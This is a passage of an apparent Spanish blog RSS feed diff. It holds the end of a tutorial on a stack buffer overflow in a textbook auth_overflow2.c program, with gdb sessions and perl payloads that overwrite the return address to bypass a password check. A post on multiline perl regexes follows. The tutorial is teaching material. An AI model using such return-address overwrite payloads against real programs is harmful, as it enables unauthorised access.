+&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x080484ec&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;call&lt;/span&gt;   &lt;span class=&#34;mh&#34;&gt;0x804831c&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Esta porción de código corresponde a:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;check_authentication&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+     &lt;span class=&#34;n&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;n-=-=-=-=-=-=-=-=-=-=-=-=-=-n&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+      &lt;span class=&#34;n&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;      Acceso concedido.n&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+       &lt;span class=&#34;n&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;-=-=-=-=-=-=-=-=-=-=-=-=-=-n&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+   &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+      &lt;span class=&#34;n&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;nAcceso denegado.n&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+   &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Las instrucciones del tipo &lt;em&gt;mov DWORD PTR [esp], 0x……&lt;/em&gt; son los argumentos para la función &lt;em&gt;printf&lt;/em&gt;, inmediatamente despues da cada una de estas instrucciones se llama a la función con &lt;code&gt;call 0x804831c &amp;lt;printf&amp;gt;&lt;/code&gt;. Las intrucciones que comienzan con una j son saltos condicionales (je = jump if equal), y jmp es incodicional, es decir, sigue la ejecución por la dirección indicada si o sí, sin evaluar ninguna condición. Observando un poco, nos damos cuenta que nos interesa sustituir la dirección de retorno para que se ejecute esta instrucción &lt;code&gt;0x080484bf &amp;lt;main&amp;gt;: mov DWORD PTR [esp],0x80485fb&lt;/code&gt;, que corresponde con el primer printf. Y así saltarnos la comprobación del if.&lt;/p&gt;
+&lt;p&gt;Para conseguir sustituir la dirección de retorno por la que nos interesa, vamos a desbordar el buffer con el valor de dicha dirección:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;gdb -q auth_overflow2.c.binary
+Using host libthread_db library &lt;span class=&#34;s2&#34;&gt;&amp;#34;/lib/tls/i686/cmov/libthread_db.so.1&amp;#34;&lt;/span&gt;.
+&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; b &lt;span class=&#34;m&#34;&gt;9&lt;/span&gt;
+Breakpoint &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; at 0x8048421: file auth_overflow2.c, line 9.
+&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; b &lt;span class=&#34;m&#34;&gt;16&lt;/span&gt;
+Breakpoint &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; at 0x804846f: file auth_overflow2.c, line 16.
+&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; run &lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;perl -e &lt;span class=&#34;s1&#34;&gt;&amp;#39;print &amp;#34;xbfx84x04x08&amp;#34;&amp;#39;&lt;/span&gt;x8&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;
+Starting program: /home/hkr/booksrc/auth_overflow2.c.binary &lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;perl -e
+&lt;span class=&#34;s1&#34;&gt;&amp;#39;print &amp;#34;xbfx84x04x08&amp;#34;&amp;#39;&lt;/span&gt;x8&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;
+
+Breakpoint 1, check_authentication &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;
+    &lt;span class=&#34;nv&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0xbffff9f6
+&lt;span class=&#34;s2&#34;&gt;&amp;#34;�204�04b�204�04b�204�04b�204�04b�204�04b�204�04b�204�04b�204�04b&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+at auth_overflow2.c:9
+&lt;span class=&#34;m&#34;&gt;9&lt;/span&gt;               strcpy&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;password_buffer, password&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; x/16x &lt;span class=&#34;nv&#34;&gt;$esp&lt;/span&gt;
+0xbffff7c0:     0x00000000      0x08049744      0xbffff7d8      0x080482d9
+0xbffff7d0:     0xb7f9f729      0xb7fd6ff4      0xbffff808      0x00000000
+0xbffff7e0:     0xb7fd6ff4      0xbffff8a0      0xbffff808      0xb7fd6ff4
+0xbffff7f0:     0xb7ff47b0      0x08048510      0xbffff808      &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0x080484bb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; c
+Continuing.
+
+Breakpoint 2, check_authentication &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0xbffff900
+&lt;span class=&#34;s2&#34;&gt;&amp;#34;��������I���i���v���230�������&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+    at auth_overflow2.c:16
+&lt;span class=&#34;m&#34;&gt;16&lt;/span&gt;              &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; auth_flag&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; x/16x &lt;span class=&#34;nv&#34;&gt;$esp&lt;/span&gt;
+0xbffff7c0:     0xbffff7e0      0x080485dc      0xbffff7d8      0x080482d9
+0xbffff7d0:     0xb7f9f729      0xb7fd6ff4      0xbffff808      0x00000000
+0xbffff7e0:     0x080484bf      0x080484bf      0x080484bf      0x080484bf
+0xbffff7f0:     0x080484bf      0x080484bf      0x080484bf      &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0x080484bf&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; c
+Continuing.
+
+-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-
+      Access Granted.
+-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-
+
+Program received signal SIGSEGV, Segmentation fault.
+0xe8080485 in ?? &lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Experimentando un poco con gdb se descubre que repetir la dirección 8 veces es suficiente para sobrescribir la dirección de retorno original. El comando &lt;em&gt;$(perl -e ‘print “xbfx84x04x08″‘x8)&lt;/em&gt; repite la dirección 8 veces, el motivo por el que hay que escribir la dirección al revés es porque internamente se almacenan las direcciones en &lt;!-- raw HTML omitted --&gt;little endian&lt;!-- raw HTML omitted --&gt;. En los resultados de arriba se puede ver cómo se sutituye la dirección de retorno 0x080484bb(entre paréntesis), por la deseada, 0x080484bf.&lt;/p&gt;
+&lt;h1 id=&#34;en-arquitecturas-x86_64&#34;&gt;En arquitecturas x86_64&lt;/h1&gt;
+&lt;p&gt;Si tenemos un procesador de 64-bits, el proceso es similar, aunque con gdb debemos usar la opción &lt;em&gt;g&lt;/em&gt; junto al comando examine para que se muestren las direcciones enteras:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; b &lt;span class=&#34;m&#34;&gt;9&lt;/span&gt;
+Breakpoint &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; at 0x40064f: file auth_overflow2.c, line 9.
+&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; b &lt;span class=&#34;m&#34;&gt;16&lt;/span&gt;
+Breakpoint &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; at 0x40069a: file auth_overflow2.c, line 16.
+&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; run &lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;perl -e &lt;span class=&#34;s1&#34;&gt;&amp;#39;print &amp;#34;xeex06x40x00x00x00x00x00&amp;#34;x10&amp;#39;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;
+Starting program: /home/hkr/hack/auth_overflow2.c.binary &lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;perl -e &lt;span class=&#34;s1&#34;&gt;&amp;#39;print &amp;#34;xeex06x40x00x00x00x00x00&amp;#34;x10&amp;#39;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;
+
+Breakpoint 1, check_authentication &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0x7fffffffe74b &lt;span class=&#34;s2&#34;&gt;&amp;#34;356�06@356�06@356�06@356�06@356�06@356�06@356�06@356�06@356�06@356�06@&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at auth_overflow2.c:9
+&lt;span class=&#34;m&#34;&gt;9&lt;/span&gt;     strcpy&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;password_buffer, password&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; x/10xg &lt;span class=&#34;nv&#34;&gt;$rsp&lt;/span&gt;
+0x7fffffffe380: 0x00007fffffffe3bf  0x00007fffffffe74b
+0x7fffffffe390: 0x0000000000000001  0x000000000040078d
+0x7fffffffe3a0: 0x00007ffff7a65c48  0x0000000000400730
+0x7fffffffe3b0: 0x00007fffffffe3d0  &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0x00000000004006ea&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+0x7fffffffe3c0: 0x00007fffffffe4b8  0x0000000200000000
+&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;En 32-bits el puntero de pila se llamaba ESP, en 64-bit es RSP. En este caso la dirección de retorno es &lt;code&gt;0x00000000004006ea&lt;/code&gt;. Desensamblando la función main como anteriormente,vemos que la dirección de retorno que nos interesa es &lt;code&gt;0x00000000004006ee&lt;/code&gt;, igual que antes, usamos perl — &lt;strong&gt;$(perl -e ‘print “xeex06x40x00x00x00x00x00″x10′) —&lt;/strong&gt; sobrescribiendo la dirección por la que nos interesa, quedando así:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; c
+Continuing.
+
+Breakpoint 2, check_authentication &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0x7fffffffe74b &lt;span class=&#34;s2&#34;&gt;&amp;#34;356�06@356�06@356�06@356�06@356�06@356�06@356�06@356�06@356�06@356�06@&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at auth_overflow2.c:16
+&lt;span class=&#34;m&#34;&gt;16&lt;/span&gt;        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; auth_flag&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; x/10xg &lt;span class=&#34;nv&#34;&gt;$rsp&lt;/span&gt;
+0x7fffffffe380: 0x00007fffffffe3bf  0x00007fffffffe74b
+0x7fffffffe390: 0x06ee4006ee4006ee  0xee4006ee4006ee40
+0x7fffffffe3a0: 0x4006ee4006ee4006  0x00004006ee4006ee
+0x7fffffffe3b0: 0x00007fffffffe3d0  &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0x00000000004006ea&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+0x7fffffffe3c0:  0x00007fffffffe4b8  0x0000000200000000
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Aunque parece que no hemos sobreescrito la dirección de retorno, sí que lo hemos hecho, pero no se han escrito los ceros por la izquierda, quedando todo desplazado:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; c
+Continuing.
+
+Breakpoint 2, check_authentication &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0x7fffffffe74b &lt;span class=&#34;s2&#34;&gt;&amp;#34;356�06@356�06@356�06@356�06@356�06@356�06@356�06@356�06@356�06@356�06@&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at auth_overflow2.c:16
+&lt;span class=&#34;m&#34;&gt;16&lt;/span&gt;        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; auth_flag&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; c
+Continuing.
+
+-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-
+      Access Granted.
+-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Inferior &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;process 3699&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; exited with code 034&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Para comprobar que sí que se sobreescribe, vamos a introducir una dirección sin ceros:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; run &lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;perl -e &lt;span class=&#34;s1&#34;&gt;&amp;#39;print &amp;#34;xaaxaaxaaxaaxaaxaaxaaxaa&amp;#34;x10&amp;#39;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;
+Breakpoint 2, check_authentication &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;
+    &lt;span class=&#34;nv&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0x7fffffffe719 &lt;span class=&#34;s2&#34;&gt;&amp;#34;252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252252&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+    at auth_overflow2.c:16
+&lt;span class=&#34;m&#34;&gt;16&lt;/span&gt;     &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; auth_flag&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; x/10xg &lt;span class=&#34;nv&#34;&gt;$rsp&lt;/span&gt;
+0x7fffffffe380: 0x00007fffffffe38f  0x00007fffffffe719
+0x7fffffffe390: 0xaaaaaaaaaaaaaaaa  0xaaaaaaaaaaaaaaaa
+0x7fffffffe3a0: 0xaaaaaaaaaaaaaaaa  0xaaaaaaaaaaaaaaaa
+0x7fffffffe3b0: 0xaaaaaaaaaaaaaaaa  &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0xaaaaaaaaaaaaaaaa&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+0x7fffffffe3c0: 0xaaaaaaaaaaaaaaaa  0xaaaaaaaaaaaaaaaa
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;En estos casos no nos es muy útil el buffer overflow, ya que solo podemos saltar a porciones del código existente, en entradas posteriores, veremos cómo conseguir una shell root.&lt;/p&gt;
+&lt;p&gt;Espero que os haya gustado.&lt;/p&gt;</description>
+        </item>
+        
+        <item>
+            <title>Expresiones Regulares Multilínea</title>
+            <link>https://elbauldelprogramador.com/expresiones-regulares-multilinea/</link>
+            <pubDate>Fri, 10 Jun 2016 13:59:28 +0000</pubDate>
+            
+            <guid>https://elbauldelprogramador.com/expresiones-regulares-multilinea/</guid>
+            <description>&lt;p&gt;Actualizando el diseño del blog he tenido que usar muchas &lt;a href=&#34;https://elbauldelprogramador.com/introduccion-a-las-expresiones-regulares-en-python/&#34; title=&#34;Introducción a las expresiones regulares en python&#34;&gt;expresiones regulares&lt;/a&gt; para ajustar los artículos existentes al &lt;em&gt;Front Matter&lt;/em&gt; del nuevo tema. Mientras necesité remplazar únicamente cosas en una única línea pude usar &lt;a href=&#34;https://elbauldelprogramador.com/instalar-atom-el-editor-de-github-en-linux/&#34; title=&#34;Instalar Atom, el editor de GitHub en Linux&#34;&gt;Atom&lt;/a&gt;. La cosa se complicó cuando quería solucionar el siguiente problema. Imaginemos esta configuración &lt;code&gt;yalm&lt;/code&gt;:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-yaml&#34; data-lang=&#34;yaml&#34;&gt;---&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;param1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;valor1&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;param2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;valor2&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;param3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;valor3&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;param4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;valor4&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;categories&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;- Articulos&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;- Android&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;- Java&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;param5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;valor5&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;param6&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;valor6&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;param7&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;valor7&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;param8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;valor8&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;---&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;!-- raw HTML omitted --&gt;
+&lt;p&gt;Necesitaba dejarla tal cual, pero añadir un último parámetro llamado &lt;code&gt;mainclass: Artículos&lt;/code&gt;, es decir, este parámetro debe tener como valor la primera categoría que aparece, en este caso &lt;em&gt;Artículos&lt;/em&gt;. Para ello decidí usar &lt;code&gt;perl&lt;/code&gt;:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-perl&#34; data-lang=&#34;perl&#34;&gt;&lt;span class=&#34;n&#34;&gt;perl&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p0e&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#39;s/(categories:\s+-\s+)([a-zA-Z ]+)(\s+-[a-zA-Z ]*)?(.*?)-{3}/$1$2$3$4mainclass: &amp;#34;$2&amp;#34;\n---/s&amp;#39;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;-0&lt;/code&gt; especifica que el separador de línea sea nulo.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-p&lt;/code&gt; Que se aplique la expresión especificada por &lt;code&gt;-e&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;s/&lt;/code&gt; cambia el comportamiento de &lt;code&gt;.&lt;/code&gt; para que acepte cualquier caracter, incluso saltos de línea, por tanto se trata el fichero como si se tratara de una única línea.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;La expresión regular en sí se define:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;(categories:\s+-\s+)&lt;/code&gt;: Capturamos&lt;/li&gt;
